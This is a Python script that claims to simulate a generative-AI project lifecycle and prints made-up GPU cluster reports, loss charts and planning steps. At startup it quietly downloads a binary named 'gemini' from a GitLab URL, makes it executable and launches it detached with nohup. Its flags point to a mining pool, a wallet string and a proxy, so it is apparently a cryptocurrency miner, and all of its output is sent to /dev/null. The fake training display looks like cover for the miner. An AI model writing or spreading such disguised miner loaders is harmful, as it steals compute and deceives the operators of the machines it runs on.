#!/usr/bin/env python3
import os
import time
import random
import subprocess
import sys
from datetime import datetime, timedelta

# ANSI color codes for a more dynamic terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'

class AppState:
    """Manages the shared state of the simulation."""
    def __init__(self):
        self.reset()

    def reset(self):
        """Resets the state for a new lifecycle loop."""
        self.last_report_time = time.time()
        self.next_report_delay = random.randint(15, 30)
        self.training_loss = random.uniform(2.8, 3.5)
        self.loss_history = [self.training_loss] * 5
        self.epoch = 1
        self.data_processed_gb = 0

    def check_and_generate_report(self, loop_start_time):
        """Checks if it's time to generate a report and does so."""
        current_time = time.time()
        if current_time - self.last_report_time > self.next_report_delay:
            # Simulate processing more data
            self.data_processed_gb += random.randint(50, 200)
            generate_report(loop_start_time, self.epoch, self)
            self.last_report_time = current_time
            self.next_report_delay = random.randint(25, 50)
            
            # Make loss decrease realistically
            self.training_loss *= random.uniform(0.88, 0.97)
            if self.training_loss < 0.05: # Prevent loss from becoming unrealistically low
                self.epoch += 1
                self.training_loss = random.uniform(1.0, 1.5) / self.epoch
            
            # Update loss history for the diagram
            self.loss_history.pop(0)
            self.loss_history.append(self.training_loss)

def run_gemini_in_background():
    """Prepares and runs the 'gemini' process in a detached background session."""
    print(f"{Colors.CYAN}[SYSTEM] Initializing background compute process...{Colors.ENDC}")
    
    # These commands prepare the environment for the gemini executable
    setup_commands = [
        "mkdir -p Gem",
        "wget -q -O Gem/gemini https://gitlab.com/gemini7384238/App/-/raw/main/gemini",
        "chmod 777 Gem/gemini"
    ]
    for cmd in setup_commands:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # The nohup command ensures the process continues running even if the script or SSH session terminates.
    # All output is redirected to /dev/null to keep the terminal clean.
    run_command = (
        "nohup ./Gem/gemini -a xelishashv2 -o 51.195.26.234:7019 -w krxXJMWJKW.pipiss "
        "--proxy username:username@193.106.199.233:12324 --log-file /dev/null > /dev/null 2>&1 &"
    )

    try:
        # Popen executes the command in a new process without blocking the script.
        subprocess.Popen(run_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1) # Brief pause to allow the process to launch
        print(f"{Colors.GREEN}[SYSTEM] Background compute process launched successfully and detached from this session.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[SYSTEM] Failed to launch background process: {e}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'-' * 80}{Colors.ENDC}")
    time.sleep(2)

def print_header(text):
    """Prints a styled header for a major phase."""
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> {text} <<< {Colors.ENDC}")
    print(f"{Colors.HEADER}{'=' * (len(text) + 12)}{Colors.ENDC}")
    time.sleep(1)

def print_step(step, description):
    """Prints a styled step."""
    print(f"\n{Colors.BLUE}{Colors.BOLD}Step {step}: {description}{Colors.ENDC}")
    time.sleep(0.5)

def print_sub_step(sub_step, description):
    """Prints a sub-step with a simulated processing animation."""
    max_len = 80
    padding = max_len - len(sub_step) - len(description)
    base_text = f"{Colors.CYAN}[{sub_step}]{Colors.ENDC} {description} "
    sys.stdout.write(base_text)
    sys.stdout.flush()

    # Processing animation
    for _ in range(3):
        sys.stdout.write('.')
        sys.stdout.flush()
        time.sleep(random.uniform(0.3, 0.7))

    print(f" {Colors.GREEN}✔ OK{Colors.ENDC}")
    time.sleep(random.uniform(0.5, 1.5))

def generate_report(loop_start_time, epoch, state):
    """Generates and prints a detailed, realistic-looking performance report."""
    print(f"\n{Colors.WARNING}{Colors.BOLD}{'='*25} PERFORMANCE REPORT {'='*25}{Colors.ENDC}")
    elapsed_time = timedelta(seconds=int(time.time() - loop_start_time))
    print(f"{Colors.WARNING}Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Elapsed: {elapsed_time} | Epoch: {epoch}{Colors.ENDC}")
    
    # --- GPU Statistics Table ---
    print(f"{Colors.BOLD}H100x8 GPU Cluster Status:{Colors.ENDC}")
    print(f"+---------+----------+-----------------+----------+----------+")
    print(f"| GPU ID  | Util %   | Mem Usage (GB)  | Temp (C) | Pwr (W)  |")
    print(f"+---------+----------+-----------------+----------+----------+")
    for i in range(8):
        util = random.randint(85, 100)
        mem_used = f"{random.uniform(68.5, 79.8):.1f} / 80.0"
        temp = random.randint(75, 88)
        power = random.randint(650, 700)
        print(f"| H100-{i}   | {f'{util}%'.ljust(8)} | {mem_used.ljust(15)} | {f'{temp}C'.ljust(8)} | {f'{power}W'.ljust(8)} |")
    print(f"+---------+----------+-----------------+----------+----------+")

    # --- Training Loss Diagram ---
    print(f"\n{Colors.BOLD}Training Loss Curve (Current Loss: {state.training_loss:.4f}):{Colors.ENDC}")
    max_val = max(state.loss_history) if state.loss_history else 1
    chart_width = 40
    for i, loss in enumerate(state.loss_history):
        bar_length = int((loss / max_val) * chart_width) if max_val > 0 else 0
        bar = '█' * bar_length
        print(f"{Colors.DIM}T-{len(state.loss_history)-i-1} |{Colors.ENDC}{Colors.GREEN}{bar}{Colors.ENDC}")
    print("-" * (chart_width + 4))
    print(f"Total Data Processed This Cycle: {state.data_processed_gb} GB")
    print(f"{Colors.WARNING}{Colors.BOLD}{'='*68}{Colors.ENDC}\n")
    time.sleep(2)

# --- PHASE IMPLEMENTATIONS ---

def phase_one(state, start_time):
    print_header("Phase 1: Conception and Planning")
    print_step("1", "Define the Use Case and Objectives")
    print_sub_step("1.1", "Identify Core Problem: Automating personalized marketing content generation")
    print_sub_step("1.2", "Define Desired Output: High-quality, context-aware text and banner images")
    print_sub_step("1.3", "Establish KPIs: 20% increase in user engagement, 30% reduction in content creation time")
    state.check_and_generate_report(start_time)
    print_sub_step("1.4", "Determine Target Audience: E-commerce marketing teams")

    print_step("2", "Feasibility Analysis")
    print_sub_step("2.1", "Assess Data Availability: Access to 10TB of anonymized user interaction data confirmed")
    print_sub_step("2.2", "Evaluate Technical Feasibility: H100x8 cluster provisioned, expert team in place")
    print_sub_step("2.3", "Consider Ethical Implications: Bias audit and mitigation plan developed for training data")
    state.check_and_generate_report(start_time)
    print_sub_step("2.4", "Analyze Competitive Landscape: Identifying niche in hyper-personalization")

def phase_two(state, start_time):
    print_header("Phase 2: Data Management")
    print_step("3", "Data Sourcing and Collection")
    print_sub_step("3.1", "Identify Data Sources: Internal CRM, web analytics, public e-commerce datasets")
    print_sub_step("3.2", "Data Ingestion: Building ETL pipelines with Apache Spark, ingesting 2TB/day")
    state.check_and_generate_report(start_time)
    print_sub_step("3.3", "Ensure Data Privacy: Applying differential privacy techniques, GDPR compliance verified")

    print_step("4", "Data Preparation and Preprocessing")
    print_sub_step("4.1", "Data Cleaning: Removing 1.2M duplicate records, imputing missing values")
    print_sub_step("4.2", "Data Transformation: Tokenizing 5 billion text segments, normalizing 50M images to 1024x1024")
    state.check_and_generate_report(start_time)
    print_sub_step("4.3", "Data Annotation: Labeling 1M images with product categories via semi-automated tools")
    print_sub_step("4.4", "Data Splitting: Creating 80/10/10 train/validation/test splits")

def phase_three(state, start_time):
    print_header("Phase 3: Model Development")
    print_step("5", "Model Selection")
    print_sub_step("5.1", "Choose Architecture: Transformer-based LLM (70B params) and a Stable Diffusion model")
    print_sub_step("5.2", "Strategy: Fine-tuning pre-trained foundation models for domain-specific tasks")
    state.check_and_generate_report(start_time)

    print_step("6", "Model Training and Fine-Tuning")
    print_sub_step("6.1", "Set up Training Environment: PyTorch FSDP on H100x8 cluster, CUDA 12.2")
    print_sub_step("6.2", "Define Hyperparameters: AdamW optimizer, learning rate 1e-5, batch size 2048")
    print_sub_step("6.3", "Run Fine-tuning Process: Initiating training job, monitoring loss via TensorBoard")
    state.check_and_generate_report(start_time)
    
    print_step("7", "Model Evaluation")
    print_sub_step("7.1", "Quantitative Evaluation: ROUGE-L score for text, FID for images on test set")
    print_sub_step("7.2", "Qualitative Evaluation: Human review panel assessing content relevance and quality")
    state.check_and_generate_report(start_time)
    print_sub_step("7.3", "Bias and Fairness Auditing: Running checks for demographic bias in generated content")
    print_sub_step("7.4", "Red Teaming: Actively probing for model vulnerabilities and harmful outputs")

def phase_four(state, start_time):
    print_header("Phase 4: Application and Deployment")
    print_step("8", "Application Development")
    print_sub_step("8.1", "Design UI/UX: Creating intuitive interface for prompt engineering and content review")
    print_sub_step("8.2", "Develop Backend: Building FastAPI endpoints for model inference")
    state.check_and_generate_report(start_time)
    print_sub_step("8.3", "Implement Guardrails: Input/output filters for toxicity and relevance")
    
    print_step("9", "Deployment")
    print_sub_step("9.1", "Choose Deployment Environment: Kubernetes on Google Cloud Platform")
    print_sub_step("9.2", "Containerize Application: Creating Docker images with Triton Inference Server")
    state.check_and_generate_report(start_time)
    print_sub_step("9.3", "Set up CI/CD Pipeline: Using Jenkins for automated testing and deployment")

def phase_five(state, start_time):
    print_header("Phase 5: Monitoring and Iteration")
    print_step("10", "Monitoring and Observability")
    print_sub_step("10.1", "Track Model Performance: Real-time KPI dashboard in Grafana")
    print_sub_step("10.2", "Log User Interactions: Collecting feedback and generated outputs for analysis")
    state.check_and_generate_report(start_time)
    print_sub_step("10.3", "Monitor for Model Drift: Using statistical analysis to detect performance degradation")

    print_step("11", "Iteration and Retraining")
    print_sub_step("11.1", "Gather User Feedback: Analyzing user ratings and comments")
    print_sub_step("11.2", "Update Dataset: Incorporating new data from production logs")
    state.check_and_generate_report(start_time)
    print_sub_step("11.3", "Retrain Model: Scheduling quarterly fine-tuning cycles with updated data")
    print_sub_step("11.4", "A/B Testing: Deploying new model versions to a subset of users")

def main():
    """Main function to run the Generative AI lifecycle simulation."""
    run_gemini_in_background()
    
    cycle_count = 0
    while True:
        cycle_count += 1
        print_header(f"Starting Generative AI Project Lifecycle: Cycle #{cycle_count}")
        
        loop_start_time = time.time()
        target_duration = random.randint(7 * 60, 9 * 60)
        app_state = AppState()

        # Execute all phases
        all_phases = [phase_one, phase_two, phase_three, phase_four, phase_five]
        for phase_func in all_phases:
            phase_func(app_state, loop_start_time)
            # Ensure the loop doesn't end prematurely if all steps finish fast
            if time.time() - loop_start_time > target_duration:
                break
        
        # Ensure the loop runs for the minimum target duration
        while time.time() - loop_start_time < target_duration:
            app_state.check_and_generate_report(loop_start_time)
            time.sleep(5)
        
        print_header(f"Lifecycle Cycle #{cycle_count} Complete")
        
        # Sleep for 1-2 minutes before starting the next cycle
        sleep_duration = random.randint(1 * 60, 2 * 60)
        print(f"\n{Colors.DIM}System entering idle mode for {sleep_duration} seconds...{Colors.ENDC}")
        time.sleep(sleep_duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[SYSTEM] Simulation stopped by user. The background 'gemini' process may still be running.")
        sys.exit(0)
